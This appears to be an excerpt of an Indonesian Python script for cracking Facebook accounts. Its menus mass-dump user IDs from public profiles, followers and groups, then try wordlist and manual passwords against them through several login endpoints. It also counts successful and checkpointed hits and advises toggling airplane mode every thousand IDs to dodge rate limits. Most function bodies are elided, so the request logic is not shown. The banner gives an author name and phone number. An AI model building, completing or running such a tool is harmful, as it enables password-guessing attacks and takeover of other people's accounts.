...
def banner():
	clear()
	popen_xd(f'''\t
     {m}8888888        dTb  dTb        888    888
       {k}888        4•   \/   •B      888    888
       {h}888        6•        •P      888    888
       {b}888        'T;      ;P       888    888
       {u}888          'T;   ;P'       8888888888
     {p}8888888         '°\/°           88888888
...
def login_lagi334():
	try:
		...
		print(f'  {u}[{h}•{u}]{h} LOGIN BERHASIL.........jalankan ulang{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	print('{h}Selamat Datang %s {k}SI ANAK HARAM'%(my_name)) 
	popen_xd(f'{u}ID  : '+str(my_id))
	popen_xd(f'{h}IP  : {ip}')
	print('{b}PILIH PENGEN NGAPAIN LO')
	print('{m}[1] Crack Publik     {k}★     {h}[2] Crack Follower\n {k}[3] Crack Grup     {k}★     [4] Crack File\n{h}[5] Hasil Crack     {k}★     {h}[0] Keluar ')
...
def dump_massal():
	try:
		...
		exit()
		print('{u}Pastikan Gunakan ID publik...') 
	try:
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('{b}MAU TIPE AKUN YANG MANA ?')
	print('{m}[1] Akun Old \n{k}[2] Akun New\n{h}[3] Random ') 
	print('')
	hu = input('➣Pilih : ')
	if hu in ['1','01']:
		...
		exit()
	print('{b}PILIH METODE LOGIN MU') 
	print('{m}[1] Mobile(Sangat Disarankan)     {k}★     {h}[2] Mbasic(Disarankan)\n{k}[3] Touch     {k}★     {u}[4] Mtouch ')
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
...
#	else:
#		taplikasi.append('no')
	pwplus=input('TAMBAHKAN PASWORD MANUAL / DEPAULT( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('SELAMAT MENUNGGU HASIL, SEMOGA BERUNTUNG')
	...
	print(f'Mainkan Mode Pesawat Setiap {h}1k{u} Id\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{x}PNS-ID-->{P}[{x}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
if __name__=='__main__':
	...
	popen_xd(f'\n\t{k}[+] WELLCOME TO MY SCRIPT.... \n\t{k}[+] HARAP GUNAKAN DENGAN BIJAK\n\t{k}[+] INI SCRIPT FREE \n\t{k}[+] TIDAK UNTUK DIPERJUAL BELIKAN \n\t{k}[+] INFO LANJUT......... \n\t{k}[+] FB :ʬʬ-ʚïɞ POPEN NOPRIANSYAH ʚïɞ-ʬʬ\n\t{k}[+] WA : 082311023880\n\t{k}[+] I AM  FROM BENGKULU\n\t{k}[+] SEE YOU') 
	time.sleep(3)
	login()
